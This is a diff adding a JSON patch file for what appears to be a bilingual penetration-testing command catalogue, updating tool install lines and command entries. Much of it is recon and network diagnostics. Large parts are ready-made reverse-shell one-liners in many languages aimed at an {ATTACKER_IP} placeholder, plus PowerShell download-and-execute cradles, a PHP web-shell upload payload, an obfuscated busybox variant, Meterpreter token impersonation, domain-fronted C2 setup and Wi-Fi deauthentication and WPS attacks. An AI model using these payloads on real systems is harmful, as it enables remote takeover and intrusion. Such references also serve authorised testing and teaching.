@@ -1,0 +1,776 @@
+{
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "gobuster",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "gobuster dns -d {DOMAIN} -w subdomains.txt"
+    },
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "使用 dns 模式和子域字典查询候选主机名，保存解析值并过滤通配 DNS，结果还需进行所有权确认。",
+      "en": "Use dns mode and a subdomain wordlist to query candidate hostnames, preserving answers and filtering wildcard DNS before ownership confirmation."
+     }
+    }
+   ]
+  },
+  {
+   "id": "gobuster-advanced",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "gobuster dns -d {DOMAIN} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --resolver 8.8.8.8:53"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "gobuster dir -u http://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt -t 50"
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "用 SecLists raft-medium 词表做目录枚举，按技术栈追加扩展名并限并发 50；词表清单只是资源，真正下发的是这条 dir 命令。",
+      "en": "Run directory enumeration against the SecLists raft-medium wordlist, appending stack-appropriate extensions with 50 threads; the wordlist paths are just resources, this dir command is what actually runs."
+     }
+    }
+   ]
+  },
+  {
+   "id": "amass",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "amass enum -active -d {TARGET} -brute -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt"
+    },
+    {
+     "path": "commands.1.description",
+     "value": {
+      "zh": "主动枚举并暴力解析候选子域；v4 起不再有 -brute 开关，配合 -active 与词表 -w 即启用暴破解析。",
+      "en": "Active enumeration with brute resolution; amass v4 removed -brute, pairing -active with a -w wordlist enables brute forcing."
+     }
+    },
+    {
+     "path": "commands.2.command",
+     "value": "amass intel -whois -d {DOMAIN}\namass intel -d {DOMAIN} -org \"Target Corp\""
+    },
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "反向 WHOIS 与组织名关联发现；v4 移除了 -max-dns-queries 限速开关，翻找范围由组织名与域名控制。",
+      "en": "Reverse WHOIS and organization-based discovery; v4 removed -max-dns-queries, scope is controlled by the org and domain flags."
+     }
+    },
+    {
+     "path": "commands.3.command",
+     "value": "amass db -list\namass graph -d {DOMAIN}"
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "查看枚举会话与资产关系图；v4 移除了 viz 子命令，会话列表用 db -list，关系图用 graph。",
+      "en": "Inspect enumeration sessions and the asset graph; v4 removed viz, use db -list for sessions and graph for visualization."
+     }
+    }
+   ]
+  },
+  {
+   "id": "nuclei-advanced",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "nuclei -u http://{TARGET} -t ~/nuclei-templates/custom-check.yaml -severity medium"
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "加载自建模板对单目标校验；模板 YAML 写在本地文件（id/info/requests 结构见 nuclei 官方模板规范），用 -t 引用而不是把 YAML 当命令粘贴。",
+      "en": "Validate one target with a local custom template; author the YAML (id/info/requests per the nuclei template spec) in a file and reference it with -t instead of pasting YAML as a command."
+     }
+    }
+   ]
+  },
+  {
+   "id": "nuclei",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+    },
+    {
+     "path": "installation.zh",
+     "value": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+    }
+   ]
+  },
+  {
+   "id": "graphqlmap",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "git clone https://github.com/swisskyrepo/GraphQLmap && pip3 install -r requirements.txt"
+    },
+    {
+     "path": "installation.zh",
+     "value": "git clone https://github.com/swisskyrepo/GraphQLmap && pip3 install -r requirements.txt"
+    }
+   ]
+  },
+  {
+   "id": "subdomainizer",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "git clone https://github.com/nsonaniya2010/SubDomainizer.git && cd SubDomainizer && pip install -r requirements.txt"
+    },
+    {
+     "path": "installation.zh",
+     "value": "git clone https://github.com/nsonaniya2010/SubDomainizer.git && cd SubDomainizer && pip install -r requirements.txt"
+    }
+   ]
+  },
+  {
+   "id": "web-fuzzing-wordlists",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "apt install seclists / git clone https://github.com/danielmiessler/SecLists"
+    },
+    {
+     "path": "installation.zh",
+     "value": "apt install seclists / git clone https://github.com/danielmiessler/SecLists"
+    }
+   ]
+  },
+  {
+   "id": "seclists",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "apt install seclists / git clone https://github.com/danielmiessler/SecLists"
+    },
+    {
+     "path": "installation.zh",
+     "value": "apt install seclists / git clone https://github.com/danielmiessler/SecLists"
+    }
+   ]
+  },
+  {
+   "id": "pacu",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "pip install pacu / git clone https://github.com/RhinoSecurityLabs/pacu"
+    },
+    {
+     "path": "installation.zh",
+     "value": "pip install pacu / git clone https://github.com/RhinoSecurityLabs/pacu"
+    }
+   ]
+  },
+  {
+   "id": "rsactftool",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "git clone https://github.com/RsaCtfTool/RsaCtfTool && pip install -r requirements.txt"
+    },
+    {
+     "path": "installation.zh",
+     "value": "git clone https://github.com/RsaCtfTool/RsaCtfTool && pip install -r requirements.txt"
+    }
+   ]
+  },
+  {
+   "id": "regeorg",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "git clone https://github.com/L-codes/Neo-reGeorg"
+    },
+    {
+     "path": "installation.zh",
+     "value": "git clone https://github.com/L-codes/Neo-reGeorg"
+    }
+   ]
+  },
+  {
+   "id": "rubeus",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Compile: https://github.com/GhostPack/Rubeus / Or use pre-compiled binaries"
+    }
+   ]
+  },
+  {
+   "id": "seatbelt",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Compile: https://github.com/GhostPack/Seatbelt / Or use pre-compiled binaries"
+    }
+   ]
+  },
+  {
+   "id": "sharphound",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Download: https://github.com/BloodHoundAD/SharpHound/releases"
+    }
+   ]
+  },
+  {
+   "id": "pspy",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Download from: https://github.com/DominicBreuker/pspy/releases"
+    }
+   ]
+  },
+  {
+   "id": "powerview-adrecon",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Download Power Sploit: https://github.com/PowerShellMafia/PowerSploit"
+    }
+   ]
+  },
+  {
+   "id": "lazagne-tool",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Download: https://github.com/AlessandroZ/LaZagne/releases"
+    }
+   ]
+  },
+  {
+   "id": "sliver",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "curl https://sliver.sh/install | sudo bash / go install github.com/BishopFox/sliver/client@latest"
+    },
+    {
+     "path": "installation.zh",
+     "value": "curl https://sliver.sh/install | sudo bash / go install github.com/BishopFox/sliver/client@latest"
+    }
+   ]
+  },
+  {
+   "id": "grype",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "brew install grype / curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh"
+    },
+    {
+     "path": "installation.zh",
+     "value": "brew install grype / curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh"
+    }
+   ]
+  },
+  {
+   "id": "syft",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "brew install syft / curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh"
+    },
+    {
+     "path": "installation.zh",
+     "value": "brew install syft / curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh"
+    }
+   ]
+  },
+  {
+   "id": "rockyou",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Kali ships it at /usr/share/wordlists/rockyou.txt.gz (decompress with gunzip); on other systems download rockyou.txt from the SecLists or kaonashi password-list collections."
+    }
+   ]
+  },
+  {
+   "id": "feroxbuster",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "apt install feroxbuster / cargo install feroxbuster / Download binary: https://github.com/epi052/feroxbuster/releases"
+    }
+   ]
+  },
+  {
+   "id": "macos-commands",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Built-in on macOS"
+    }
+   ]
+  },
+  {
+   "id": "azure-ad-attacks",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "Install ROADtools with pip (pip install roadrecon); PowerShell modules via Install-Module AADInternals; the AzureAD module retired in March 2024, so use the Microsoft Graph PowerShell SDK instead (Install-Module Microsoft.Graph)."
+    },
+    {
+     "path": "installation.zh",
+     "value": "pip install roadrecon（ROADtools 套件）；PowerShell 模块用 Install-Module AADInternals；AzureAD 模块已于 2024 年 3 月退役，改用 Microsoft Graph PowerShell（Install-Module Microsoft.Graph）。"
+    }
+   ]
+  },
+  {
+   "id": "exchange-m365-attacks",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "MailSniper is a PowerShell script: clone its official project and load it with Import-Module MailSniper.ps1 (no PyPI package exists); AADInternals via Install-Module AADInternals; ruler installs with go install github.com/sensepost/ruler@latest"
+    },
+    {
+     "path": "installation.zh",
+     "value": "MailSniper 为 PowerShell 脚本：git clone 官方仓库后 Import-Module MailSniper.ps1（PyPI 无此包）；AADInternals 用 Install-Module AADInternals；ruler 用 go install github.com/sensepost/ruler@latest。"
+    }
+   ]
+  },
+  {
+   "id": "git-pentest",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "pip install GitHacker / git clone https://github.com/arthaud/git-dumper"
+    },
+    {
+     "path": "installation.zh",
+     "value": "pip install GitHacker / git clone https://github.com/arthaud/git-dumper"
+    }
+   ]
+  },
+  {
+   "id": "theharvester",
+   "patches": [
+    {
+     "path": "installation.en",
+     "value": "apt install theharvester / pip3 install theHarvester"
+    },
+    {
+     "path": "installation.zh",
+     "value": "apt install theharvester / pip3 install theHarvester"
+    }
+   ]
+  },
+  {
+   "id": "bash-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "exec 5<>/dev/tcp/{ATTACKER_IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "bash -i >& /dev/udp/{ATTACKER_IP}/{PORT} 0>&1"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "bash -c \"bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1\""
+    }
+   ]
+  },
+  {
+   "id": "python-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    }
+   ]
+  },
+  {
+   "id": "powershell-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    },
+    {
+     "path": "commands.3.command",
+     "value": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"{ATTACKER_IP}\",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\npowershell IEX (New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}:{PORT}/reverse.ps1')\nC:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/shell.ps1')\npowershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{ATTACKER_IP}/powercat.ps1');powercat -c {ATTACKER_IP} -p {PORT} -e cmd\""
+    }
+   ]
+  },
+  {
+   "id": "nc-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} {PORT}"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "nc -lvnp {PORT} < file\nnc {ATTACKER_IP} {PORT} > file"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} {PORT}\nnc -e /bin/bash {ATTACKER_IP} {PORT}\nnc -c sh {ATTACKER_IP} {PORT}\nnc -c /bin/sh {ATTACKER_IP} {PORT}\nnc -c bash {ATTACKER_IP} {PORT}\nnc -c /bin/bash {ATTACKER_IP} {PORT}\nnc.exe -e cmd {ATTACKER_IP} {PORT}"
+    },
+    {
+     "path": "commands.5.command",
+     "value": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f"
+    },
+    {
+     "path": "commands.6.command",
+     "value": "busybox nc {ATTACKER_IP} {PORT} -e sh\nbusybox nc {ATTACKER_IP} {PORT} -e /bin/sh\nbusybox nc {ATTACKER_IP} {PORT} -e bash\nbusybox nc {ATTACKER_IP} {PORT} -e /bin/bash\nbusybox+nc+{ATTACKER_IP}+{PORT}+-e+sh\nbusybox${IFS}nc${IFS}{ATTACKER_IP}${IFS}{PORT}${IFS}-e${IFS}sh"
+    },
+    {
+     "path": "commands.7.command",
+     "value": "ncat {ATTACKER_IP} {PORT} -e /bin/sh\nncat {ATTACKER_IP} {PORT} -e /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {ATTACKER_IP} {PORT} >/tmp/f"
+    },
+    {
+     "path": "commands.8.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 4444 >/tmp/f"
+    }
+   ]
+  },
+  {
+   "id": "bloodhound-cypher",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "MATCH p=shortestPath((n:User {name:\"USER@{DOMAIN}.COM\"})-[*1..]->(m:Group {name:\"{DOMAIN} ADMINS@{DOMAIN}.COM\"})) RETURN p"
+    }
+   ]
+  },
+  {
+   "id": "php-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "php -r '$sock=stream_socket_client(\"tcp://{ATTACKER_IP}:{PORT}\");$proc=proc_open(\"/bin/sh -i\",[0=>$sock,1=>$sock,2=>$sock],$pipes);'"
+    }
+   ]
+  },
+  {
+   "id": "perl-reverse",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    }
+   ]
+  },
+  {
+   "id": "ruby-reverse",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER_IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ATTACKER_IP}\",\"{PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\nruby -rsocket -e 'c=TCPSocket.new(\"{ATTACKER_IP}\",\"{PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER_IP}\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    }
+   ]
+  },
+  {
+   "id": "nodejs-reverse",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "node -e \"require('child_process').spawn('/bin/bash',['-c','bash -i >& /dev/tcp/{ATTACKER_IP}/{PORT} 0>&1'])\""
+    }
+   ]
+  },
+  {
+   "id": "groovy-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "String host=\"{ATTACKER_IP}\";\nint port={PORT};\nProcess p=new ProcessBuilder(\"/bin/bash\",\"-i\").redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\np.destroy();s.close();"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "String host=\"{ATTACKER_IP}\";\nint port={PORT};\nProcess p=new ProcessBuilder(\"/bin/sh\",\"-i\").redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception ignored){}}\np.destroy();s.close();"
+    }
+   ]
+  },
+  {
+   "id": "lua-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "lua5.1 -e 'local socket=require(\"socket\"); local tcp=assert(socket.tcp()); assert(tcp:connect(\"{ATTACKER_IP}\",{PORT})); while true do local cmd,status=tcp:receive(\"*l\"); if not cmd then break end; local f=assert(io.popen(cmd..\" 2>&1\",\"r\")); local out=f:read(\"*a\"); f:close(); tcp:send(out); if status==\"closed\" then break end end; tcp:close()'"
+    }
+   ]
+  },
+  {
+   "id": "awk-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "gawk 'BEGIN{s=\"/inet/tcp/0/{ATTACKER_IP}/{PORT}\";while((s|&getline c)>0){while((c|&getline line)>0)print line|&s;close(c)}close(s)}'"
+    }
+   ]
+  },
+  {
+   "id": "windows-lateral-commands",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "# Incognito / Meterpreter\nmeterpreter> load incognito\nmeterpreter> list_tokens -u\nmeterpreter> impersonate_token \"{DOMAIN}\\\\Admin\""
+    }
+   ]
+  },
+  {
+   "id": "post-exploitation-linux",
+   "patches": [
+    {
+     "path": "commands.7.command",
+     "value": "xterm -display {ATTACKER_IP}:1"
+    }
+   ]
+  },
+  {
+   "id": "web-shells",
+   "patches": [
+    {
+     "path": "commands.4.command",
+     "value": "socat TCP:{ATTACKER_IP}:{PORT} EXEC:sh\nsocat TCP:{ATTACKER_IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane\nsocat file:`tty`,raw,echo=0 tcp-listen:{PORT}\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ATTACKER_IP}:{PORT}"
+    },
+    {
+     "path": "commands.6.command",
+     "value": "socat file:`tty`,raw,echo=0 tcp-listen:4444\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ATTACKER_IP}:4444"
+    }
+   ]
+  },
+  {
+   "id": "password-spraying",
+   "patches": [
+    {
+     "path": "commands.4.command",
+     "value": "import requests\n{TARGET} = \"http://127.0.0.1:8080/login\"\nCASES = [(\"payloader_valid\", \"PAYLOADER_WRONG\"), (\"payloader_missing\", \"PAYLOADER_WRONG\")]\nwith requests.Session() as session:\n    for username, password in CASES:\n        response = session.post({TARGET}, data={\"username\": username, \"password\": password}, timeout=5)\n        print(username, response.status_code, len(response.content))\n# No proxies, account rotation, success guessing, or credential storage."
+    }
+   ]
+  },
+  {
+   "id": "wireless-attacks",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "airodump-ng wlan0mon\nairodump-ng --bssid {TARGET}_BSSID -c 6 -w capture wlan0mon"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "# 反认证攻击强制重新连接\naireplay-ng -0 5 -a {TARGET}_BSSID wlan0mon\n# 验证握手\naircrack-ng capture*.cap"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "wash -i wlan0mon  # 扫描开启 WPS 的 AP\nreaver -i wlan0mon -b {TARGET}_BSSID -vv"
+    }
+   ]
+  },
+  {
+   "id": "bloodhound-queries",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "MATCH p=shortestPath((n:User)-[*1..]->(m:Group {name:'{DOMAIN} ADMINS@{DOMAIN}.COM'})) RETURN p"
+    },
+    {
+     "path": "commands.5.command",
+     "value": "MATCH p=(u:User)-[:AdminTo]->(c:Computer) WHERE u.name='USER@{DOMAIN}.COM' RETURN p"
+    }
+   ]
+  },
+  {
+   "id": "interactsh",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "interactsh-server -domain oast.{DOMAIN}\ninteractsh-client -server https://oast.{DOMAIN}"
+    }
+   ]
+  },
+  {
+   "id": "linux-command-tricks",
+   "patches": [
+    {
+     "path": "commands.5.command",
+     "value": "rm -f /tmp/p; mkfifo /tmp/p && telnet {ATTACKER_IP} {PORT} 0</tmp/p | /bin/sh 1>/tmp/p\ntelnet {ATTACKER_IP} 80 | /bin/bash | telnet {ATTACKER_IP} {PORT}\nmknod a p && telnet {ATTACKER_IP} {PORT} 0<a | /bin/sh 1>a\nTF=$(mktemp -u);mkfifo $TF && telnet {ATTACKER_IP} {PORT} 0<$TF | sh 1>$TF"
+    }
+   ]
+  },
+  {
+   "id": "web-authentication-bypass",
+   "patches": [
+    {
+     "path": "commands.10.command",
+     "value": "import requests\nimport time\n{TARGET} = \"http://127.0.0.1:8080/test/password-reset\"\ntokens = []\nfor index in range(5):\n    response = requests.post({TARGET}, json={\"account\": f\"payloader-{index}\"}, timeout=5)\n    response.raise_for_status()\n    token = response.json()[\"test_token\"]\n    tokens.append(token)\n    print(index, len(token), token[:6])\n    time.sleep(1)\nprint(\"unique\", len(set(tokens)) == len(tokens))\n# Analyze length and uniqueness only; do not claim predictability without a validated generator model."
+    },
+    {
+     "path": "commands.11.command",
+     "value": "import requests\n{TARGET} = \"http://127.0.0.1:8080/test/reset/validate\"\nfor token in [\"000000\", \"000001\", \"PAYLOADER_TEST_TOKEN\"]:\n    response = requests.post({TARGET}, json={\"token\": token, \"dry_run\": True}, headers={\"X-Forwarded-For\": \"192.0.2.10\"}, timeout=5)\n    print(token, response.status_code)\n# A fixed address and three-case budget verify account-based throttling; no IP or User-Agent rotation and no password change."
+    }
+   ]
+  },
+  {
+   "id": "dns-attacks",
+   "patches": [
+    {
+     "path": "commands.8.command",
+     "value": "printf '%s\\n' 'source[01] custom=cdn.example.invalid target={FASTLY_DNS_{TARGET}_FROM_CONTROL_PANEL} service={OWNED_SERVICE_ID} tls={OWNED_TLS_SUBSCRIPTION_ID}'\nprintf '%s\\n' 'source[02] custom=static.example.invalid target={FASTLY_DNS_{TARGET}_FROM_CONTROL_PANEL} service={OWNED_SERVICE_ID} tls={OWNED_TLS_SUBSCRIPTION_ID}'\nprintf '%s\\n' 'source[03] custom=assets.example.invalid target={FASTLY_DNS_{TARGET}_FROM_CONTROL_PANEL} service={OWNED_SERVICE_ID} tls={OWNED_TLS_SUBSCRIPTION_ID}'"
+    }
+   ]
+  },
+  {
+   "id": "file-upload-attacks",
+   "patches": [
+    {
+     "path": "commands.15.command",
+     "value": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' filename.png\nmv filename.png filename.php.png\nexiftool -Comment='<?php system(\"nc -e /bin/bash {ATTACKER_IP} {PORT}\"); ?>' filename.png"
+    }
+   ]
+  },
+  {
+   "id": "bluetooth-security",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "gatttool -b {TARGET}_MAC -I\n# 交互命令\nprimary  # 列出服务\ncharacteristics  # 列出特征\nchar-read-hnd 0x0001\nchar-write-req 0x0001 deadbeef"
+    }
+   ]
+  },
+  {
+   "id": "red-team-infrastrucutre",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "# 通过 CDN 隐藏 C2 流量\n# Host 头指向真实 C2\ncurl -H \"Host: real-c2.{DOMAIN}\" https://cdn.cloudflare.net/\n# Cobalt Strike 配置 malleable profile\nset host_header \"real-c2.{DOMAIN}\";"
+    }
+   ]
+  },
+  {
+   "id": "linux-network-reference",
+   "patches": [
+    {
+     "path": "commands.7.command",
+     "value": "traceroute {DOMAIN}"
+    },
+    {
+     "path": "commands.8.command",
+     "value": "mtr -rw {DOMAIN}"
+    },
+    {
+     "path": "commands.9.command",
+     "value": "dig {DOMAIN} A +short"
+    },
+    {
+     "path": "commands.11.command",
+     "value": "curl -I https://{TARGET}"
+    },
+    {
+     "path": "commands.12.command",
+     "value": "openssl s_client -connect {DOMAIN}:443 -servername {DOMAIN}"
+    },
+    {
+     "path": "commands.13.command",
+     "value": "nc -vz {DOMAIN} 443"
+    },
+    {
+     "path": "commands.22.command",
+     "value": "whois {DOMAIN}"
+    }
+   ]
+  },
+  {
+   "id": "windows-cmd-reference",
+   "patches": [
+    {
+     "path": "commands.21.command",
+     "value": "tracert {DOMAIN}"
+    },
+    {
+     "path": "commands.22.command",
+     "value": "pathping {DOMAIN}"
+    },
+    {
+     "path": "commands.23.command",
+     "value": "nslookup {DOMAIN}"
+    }
+   ]
+  },
+  {
+   "id": "powershell-admin-reference",
+   "patches": [
+    {
+     "path": "commands.26.command",
+     "value": "Test-NetConnection {DOMAIN} -Port 443"
+    },
+    {
+     "path": "commands.27.command",
+     "value": "Resolve-DnsName {DOMAIN}"
+    }
+   ]
+  },
+  {
+   "id": "network-diagnostics-toolkit",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "curl --head --max-time 5 --write-out 'remote_ip=%{remote_ip} status=%{http_code} total=%{time_total}\\n' https://example.com"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "curl -v https://{TARGET}"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "http GET https://{TARGET}"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "wget --spider https://{TARGET}/file.zip"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "openssl s_client -showcerts -connect {DOMAIN}:443 -servername {DOMAIN}"
+    },
+    {
+     "path": "commands.5.command",
+     "value": "dig +noall +answer +comments example.com A"
+    },
+    {
+     "path": "commands.6.command",
+     "value": "dig {DOMAIN} MX +short"
+    },
+    {
+     "path": "commands.7.command",
+     "value": "mtr --report --wide --report-cycles 10 example.com"
+    }
+   ]
+  }
+ ]
+}
